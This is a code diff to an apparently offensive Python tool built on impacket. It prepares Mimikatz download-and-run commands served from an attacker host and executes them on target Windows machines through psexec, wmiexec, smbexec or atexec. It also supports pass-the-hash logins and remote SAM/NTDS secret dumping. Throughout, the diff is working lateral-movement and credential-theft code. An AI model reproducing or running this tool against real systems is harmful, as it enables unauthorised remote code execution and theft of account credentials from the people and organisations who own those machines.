@@ -43,7 +43,7 @@ except Exception as e:
     sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")
 
 class Obfiscator:
-    def __init__(self, src_ip, src_port, payload, function, argument, execution, dst_ip="", dst_port=""):
+    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, dst_ip="", dst_port=""):
         self.src_ip = src_ip
         self.dst_ip = dst_ip
         self.dst_port = dst_port
@@ -52,6 +52,7 @@ class Obfiscator:
         self.function = function
         self.argument = argument
         self.execution = execution
+        self.methods = methods
         self.command = ""
         try:
             self.run()
@@ -151,7 +152,7 @@ def hash_test(LM, NTLM, pwd):
     hash = LM + ":" + NTLM
     print("[*] Your formated hash is: %s") % (hash)
     pwd = ""
-    return(LM, NTLM, pwd)
+    return(LM, NTLM, pwd, hash)
 
 
 def main():
@@ -170,12 +171,12 @@ def main():
     iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
     iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
     iex_options.add_argument("-p", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
-    iex_options.add_argument("-x", action="store", dest="payload", default="/root/x.ps1", help="The name of the Mimikatz file")
+    iex_options.add_argument("-x", action="store", dest="payload", default="/root/Invoke-Mimikatz.ps1", help="The name of the Mimikatz file")
     iex_options.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
     iex_options.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
     attack.add_argument("--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
     attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
-    attack.add_argument("--sam_dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
+    attack.add_argument("--secrets_dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
     attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
     remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The system you are attempting to exploit")
     remote_attack.add_argument("--domain", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
@@ -184,12 +185,12 @@ def main():
     method.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
     method.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
     method.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Inject the invoker process into the system memory with smbexec")
-    method.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the invoker process into the system memory with at")
+    method.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the command task into the system memory with at on systems older than Vista")
     generator.add_argument("--filename", action="store", dest="filename", default=None, help="The file that the attack script will be dumped to")
     remote_attack.add_argument("--aes", action="store", dest="aes_key", default=None, help="The AES Key Option")
     remote_attack.add_argument("--kerberos", action="store", dest="kerberos", default=False, help="The Kerberos option")
     remote_attack.add_argument("--share", action="store", default="ADMIN$", dest="share", help="The Share to execute against, the default is ADMIN$")
-    remote_attack.add_argument('--mode', action="store", dest="mode", choices={"SERVER","SHARE"}, default="SHARE", help="Mode to use for --smbexec, default is SHARE, the other option is SERVER, which requires root access")
+    remote_attack.add_argument('--mode', action="store", dest="mode", choices={"SERVER","SHARE"}, default="SERVER", help="Mode to use for --smbexec, default is SERVER, which requires root access, SHARE does not")
     remote_attack.add_argument("--protocol", action="store", dest="protocol", choices={"445/SMB","139/SMB"}, default="445/SMB", help="The protocol to attack over, the default is 445/SMB")
     remote_attack.add_argument("--directory", action="store", dest="directory", default="C:\\", help="The directory to either drop the payload or instantiate the session")
     sam_dump_options.add_argument("--system", action="store", help="The SYSTEM hive to parse")
@@ -232,7 +233,7 @@ def main():
     command = args.command
     filename = args.filename
     sam_dump = args.sam_dump
-    mode = args.mode
+    mode = args.mode.upper()
     system = args.system
     security = args.security
     sam = args.sam
@@ -244,6 +245,7 @@ def main():
     supplement = ""
     hash = None
     methods = False
+    method_dict = {}
 
     if aes != None:
         kerberos = True
@@ -261,12 +263,12 @@ def main():
     if pwd and ":" in pwd and pwd.count(':') == 6:
         pwdump_format_hash = pwd.split(':')
         if not usr:
-            usr = pwdump_format_hash[0]
+            usr = pwdump_format_hash[0].lower()
         SID = pwdump_format_hash[1]
         LM = pwdump_format_hash[2]
         NTLM = pwdump_format_hash[3]
     if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
-        hash_test(LM, NTLM, pwd)
+        LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd)
     if pwd and ":" in pwd and pwd.count(':') == 1:
         if pwd.startswith(':'):
             LM, NTLM = pwd.split(':')
@@ -275,12 +277,13 @@ def main():
         else:
             LM, NTLM = pwd.split(':')
         if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
-            LM, NTLM, pwd =hash_test(LM, NTLM, pwd)
+            LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd)
 
-    if smbexec_cmd or wmiexec_cmd or atexec_cmd or psexec_cmd:
+    if smbexec_cmd or wmiexec_cmd or atexec_cmd or psexec_cmd or sam_dump:
+        method_dict = {"smbexec" : smbexec_cmd, "wmiexec" : wmiexec_cmd, "atexec" : atexec_cmd, "psexec" : psexec_cmd}
         if usr == None or pwd == None:
             print(2)
-            sys.exit("[!] If you are trying to exploit a system you need a username, password and domain name")
+            sys.exit("[!] If you are trying to exploit a system you need a username and password")
         if target == None:
             print(1)
             sys.exit("[!] If you are trying to exploit a system you need at least one target")
@@ -295,21 +298,16 @@ def main():
 
     if invoker:
         execution = "invoker"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict)
         command = x.return_command()
     if downloader:
         execution = "downloader"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict)
         command = x.return_command()
     elif psexec_cmd and invoker:
         execution = "psexec"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict)
         command = x.return_command()
-    elif invoker:
-        execution = "invoker"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
-        command = x.return_command()
-
 
     if "invoker" in execution:
         supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
@@ -325,20 +323,40 @@ def main():
 '''
 
     if psexec_cmd:
+        if pwd != "":
+            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
+        else:
+            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
         attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
         attack.run(target)
     elif wmiexec_cmd:
+        if hash:
+            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
+        else:
+            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
         attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
         attack.run(target)
     elif smbexec_cmd:
+        if hash:
+            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
+        else:
+            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
         attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
         attack.run(target)
     elif atexec_cmd:
+        if hash:
+            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
+        else:
+            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
         if command == "cmd.exe":
             sys.exit("[!] Please provide a viable command for execution")
         attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
         attack.play(target)
     elif sam_dump:
+        if hash:
+            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
+        else:
+            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
         attack=secretsdump.DumpSecrets(address = target, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
         try:
             attack.dump()
